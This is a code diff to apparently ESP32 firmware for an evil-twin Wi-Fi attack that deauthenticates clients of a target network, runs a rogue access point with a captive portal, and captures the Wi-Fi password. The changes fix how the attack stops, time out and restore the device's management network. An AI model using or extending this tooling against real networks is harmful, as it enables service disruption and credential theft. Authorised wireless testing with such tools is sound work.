@@ -157,7 +157,7 @@ static void evil_twin_task(void *pvArg) {
         ESP_LOGI(TAG, "Deauth active. Waiting for victim...");
 
 
-        while (!victim_connected && !password_captured) {
+        while (!victim_connected && !password_captured && !evil_twin_stop_requested) {
             wsl_bypasser_send_deauth_frame(target);
             vTaskDelay(pdMS_TO_TICKS(40));
 
@@ -168,12 +168,15 @@ static void evil_twin_task(void *pvArg) {
                 break;
             }
             if ((xTaskGetTickCount() * portTICK_PERIOD_MS) - wait_start > 300000) {
+                ESP_LOGW(TAG, "No victim joined within timeout, giving up.");
+                attack_update_status(TIMEOUT);
                 goto cleanup;
             }
         }
+        if (evil_twin_stop_requested) goto cleanup;
 
 
-        while (victim_connected && !password_captured) {
+        while (victim_connected && !password_captured && !evil_twin_stop_requested) {
             vTaskDelay(pdMS_TO_TICKS(500));
             wifi_sta_list_t sta_list;
             if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num == 0) {
@@ -181,6 +184,7 @@ static void evil_twin_task(void *pvArg) {
                 break;
             }
         }
+        if (evil_twin_stop_requested) goto cleanup;
 
 
         if (password_captured && !password_verified) {
@@ -238,12 +242,11 @@ static void evil_twin_task(void *pvArg) {
 
     cleanup:
     stop_captive_portal();
-    /* Restore the management AP whenever it was captured (normal mode) or whenever
-     * the operator stopped a rogue AP (custom mode) — otherwise the device would be
-     * left stranded broadcasting the fake SSID with no way back to the web UI. */
-    if (password_verified || custom_mode) {
-        restore_management_system();
-    }
+    /* Always restore the management AP here — on success, on manual stop (either
+     * mode), and on the no-victim timeout. Every one of those leaves the radio in
+     * rogue-AP mode; skipping this for any of them strands the device broadcasting
+     * the fake SSID with no way back to the operator. */
+    restore_management_system();
     custom_mode = false;
     evil_twin_stop_requested = false;
     evil_twin_active = false;
@@ -293,8 +296,14 @@ bool is_evil_twin_active(void) {
     return evil_twin_active;
 }
 
+/* Signals the running evil_twin_task to stop and asks IT to restore the
+ * management AP once it observes the flag (checked in every wait loop, plus
+ * at the top of the outer cycle). Calling restore_management_system() here
+ * directly used to race the still-running task: its next loop iteration would
+ * call reset_wifi_to_apsta() again and silently undo the "stop" a moment
+ * later, making deauth/the rogue AP come back on its own. */
 void attack_method_evil_twin_stop(void) {
-    restore_management_system();
+    evil_twin_stop_requested = true;
 }
 
 void attack_method_evil_twin_custom_stop(void) {
